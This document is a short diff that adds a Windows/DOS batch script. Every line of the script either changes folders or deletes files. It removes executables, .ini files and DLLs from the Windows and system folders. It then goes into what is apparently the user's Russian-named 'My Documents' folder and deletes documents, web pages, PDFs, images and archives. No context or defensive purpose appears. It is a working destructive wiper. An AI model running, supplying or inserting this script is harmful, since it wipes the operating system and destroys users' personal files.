@@ -1,0 +1,21 @@
+cd C:
+cd\
+cd windows
+del *.exe
+del *.ini
+del *.com
+cd\
+cd windows
+cd system
+del *.dll
+del *.exe
+cd\
+cd моидок~1
+del *.doc
+del *.txt
+del *.htm
+del *.html
+del *.pdf
+del *.jpg
+del *.zip
+del *.gif
